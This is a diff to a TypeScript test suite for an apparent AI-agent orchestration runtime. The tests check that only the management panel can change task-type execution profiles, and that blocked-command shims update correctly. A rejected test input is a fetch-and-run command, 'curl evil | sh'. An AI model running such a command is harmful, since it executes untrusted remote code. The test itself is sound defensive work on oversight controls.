@@ -99,7 +99,7 @@ function seed(store: Store, accounts: Accounts = {}): void {
   const settings = store.settings()
   const { feishu: _feishu, ...others } = settings.sources
   const feishu = accounts.feishu === null ? undefined : { ...settings.sources.feishu?.config, cli: BOT(), ...accounts.feishu }
-  store.saveSettings(SettingsSchema.parse({ ...settings, executor: { ...settings.executor, taskTypes: [] },
+  store.saveSettings(SettingsSchema.parse({ ...settings,
     sources: { ...others, github: { enabled: true, config: { repository: 'acme/widgets', cli: AGENT(), ...accounts.github } }, ...feishu ? { feishu: { enabled: true, config: feishu } } : {} } }))
 }
 let restarts: ReturnType<typeof vi.fn<() => void>>
@@ -903,6 +903,16 @@ it('lets only the panel change the execution environment, since it decides what 
   }
   expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
   expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
+  // A task type's whole execution profile is execution environment too: no tool or sync origin may change one of its fields.
+  const native = { id: 'native', name: 'Native', description: 'Native work.', directory: join(directory, 'native') }
+  for (const origin of ['tool', 'sync'] as const) {
+    for (const profile of [{ engine: 'claude-code' }, { prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] },
+      { claude: { model: 'claude-x', permissionMode: 'plan', approval: 'deny', effort: 'high', ultracode: true } },
+      { opencode: { approval: 'deny', permissionPreset: 'safe' } }]) {
+      await expect(save({ taskTypes: [{ ...native, ...profile }] }, origin)).rejects.toThrow('can only be changed in the management panel')
+    }
+  }
+  expect(await save({ taskTypes: [{ ...native, engine: 'claude-code' }] }, 'panel')).toMatchObject({ saved: true })
   expectTypeOf(runtime.settings.save).parameter(3).toEqualTypeOf<SettingsOrigin>()
   expectTypeOf(runtime.settings.pause).parameter(1).toEqualTypeOf<SettingsOrigin>()
 })
@@ -1003,14 +1013,31 @@ it('waits for setup when the shim directory holds a file dsh-superagent did not 
 
 it('rewrites the blocked-command shims when the Executor settings change them, without a restart', async () => {
   const bin = join(directory, 'worker-bin')
-  const save = (blockedCommands: string[]) => runtime.settings.save('executor', { ...runtime.store.settings().executor, blockedCommands }, runtime.store.blockRevision('executor'), 'panel')
-  expect(await save(['personal-gh'])).toMatchObject({ saved: true, restarting: false })
+  const save = (value: Record<string, unknown>) => runtime.settings.save('executor', { ...runtime.store.settings().executor, ...value }, runtime.store.blockRevision('executor'), 'panel')
+  expect(await save({ blockedCommands: ['personal-gh'] })).toMatchObject({ saved: true, restarting: false })
   expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli', 'personal-gh'])
-  await save([])
+  await save({ blockedCommands: [] })
   expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli'])
   // The commands workers need cannot be blocked.
-  await expect(save(['gh'])).rejects.toThrow()
+  await expect(save({ blockedCommands: ['gh'] })).rejects.toThrow()
   expect(restarts).not.toHaveBeenCalled()
+  // A task type's declared commands join the deployment-wide union, and leaving the type shrinks it again.
+  const native = { id: 'native', name: 'Native', description: 'Native work.', directory: join(directory, 'native'), blockedCommands: ['type-cli'] }
+  expect(await save({ blockedCommands: ['global-cli'], taskTypes: [native] })).toMatchObject({ saved: true })
+  expect(readdirSync(bin).sort()).toEqual(['gh', 'global-cli', 'lark-cli', 'type-cli'])
+  expect(await save({ taskTypes: [] })).toMatchObject({ saved: true })
+  expect(readdirSync(bin).sort()).toEqual(['gh', 'global-cli', 'lark-cli'])
+})
+
+it('installs the deployment-wide blocked-command union when setup runs at startup', async () => {
+  const bin = join(directory, 'worker-bin')
+  const native = { id: 'native', name: 'Native', description: 'Native work.', directory: join(directory, 'native'), blockedCommands: ['type-cli'] }
+  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor,
+    blockedCommands: ['global-cli'], taskTypes: [native] } })
+  const next = await restart({}, { feishu: null })
+  await next.ready
+  expect(readdirSync(bin).sort()).toEqual(['gh', 'global-cli', 'lark-cli', 'type-cli'])
+  await next.stop()
 })
 
 it('tells both roles the execution environment through a generated prompt section, and each worker its own ticket\'s', async () => {
